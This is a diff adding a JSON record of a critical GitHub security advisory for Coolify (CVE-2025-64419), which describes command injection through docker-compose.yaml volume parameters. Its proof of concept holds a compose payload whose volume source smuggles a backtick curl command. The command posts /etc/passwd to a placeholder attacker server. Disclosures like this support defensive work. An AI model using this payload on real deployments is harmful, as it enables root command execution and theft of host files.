@@ -1,0 +1,50 @@
+{
+  "global": null,
+  "id": "GHSA-234r-xrrg-m8f3",
+  "repo": {
+    "cve_id": "CVE-2025-64419",
+    "cvss_severities": {
+      "cvss_v3": {
+        "score": 9.6,
+        "vector_string": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:H"
+      },
+      "cvss_v4": {
+        "score": null,
+        "vector_string": null
+      }
+    },
+    "cwe_ids": [
+      "CWE-77"
+    ],
+    "description": "### Summary\r\nThe following issue was identified using Aikido’s AI pentest service.\r\n\r\nParameters coming from docker-compose.yaml are not sanitized when used in commands. If a victim user creates an application from an attacker repository (using build pack \"docker compose\"), the attacker can execute commands on the Coolify instance as root.\r\n\r\n### Details\r\nThe following function executes commands inside a docker container:\r\n`bootstrap/helpers/docker.php:120`\r\n```php\r\nfunction executeInDocker(string $containerId, string $command)\r\n{\r\n    return \"docker exec {$containerId} bash -c '{$command}'\";\r\n    // return \"docker exec {$this->deployment_uuid} bash -c '{$command} |& tee -a /proc/1/fd/1; [ \\$PIPESTATUS -eq 0 ] || exit \\$PIPESTATUS'\";\r\n}\r\n```\r\n\r\nIf the `$command` parameter is not properly escaped, we can break out `docker exec` and run commands on the Coolify host as root. Our AI Pentest service identified a possible injection via `docker-compose.yaml` parameters. After further investigation, we were able to confirm the `volumes['source']` parameter being vulnerable.\r\n\r\n### PoC\r\n1. Create an attacker repository including the following docker-compose.yaml payload:\r\n```yaml\r\nservices:\r\n  coolify:\r\n    container_name: test\r\n    image: alpine\r\n    volumes:\r\n      -\r\n        type: bind\r\n        source: '/tmp/pwn`curl https://<ATTACKER-SERVER-HERE> -X POST --data \"$(cat /etc/passwd)\"`'\r\n        target: /app\r\n    restart: always\r\n    working_dir: /var/www/html\r\n    extra_hosts:\r\n      - 'host.docker.internal:host-gateway'\r\n```\r\n2. Notice the contents of `/etc/passwd` in the pingback to the attacker server\r\n\r\n### Impact\r\nAttackers can execute commands as root on the Coolify instance when a victim deploys an application based on the attacker repository (or if the attacker has low privilege access to Coolify).\r\n",
+    "ghsa_id": "GHSA-234r-xrrg-m8f3",
+    "html_url": "https://github.com/coollabsio/coolify/security/advisories/GHSA-234r-xrrg-m8f3",
+    "identifiers": [
+      {
+        "type": "GHSA",
+        "value": "GHSA-234r-xrrg-m8f3"
+      },
+      {
+        "type": "CVE",
+        "value": "CVE-2025-64419"
+      }
+    ],
+    "published_at": "2026-01-03T15:14:44Z",
+    "references": [],
+    "severity": "critical",
+    "summary": "Command injection via docker-compose.yaml parameters",
+    "updated_at": "2026-01-08T19:05:12Z",
+    "vulnerabilities": [
+      {
+        "package": {
+          "ecosystem": "",
+          "name": ""
+        },
+        "patched_versions": "v4.0.0-beta.437",
+        "vulnerable_version_range": "< v4.0.0-beta.436"
+      }
+    ],
+    "withdrawn_at": null
+  },
+  "repository": "coollabsio/coolify"
+}
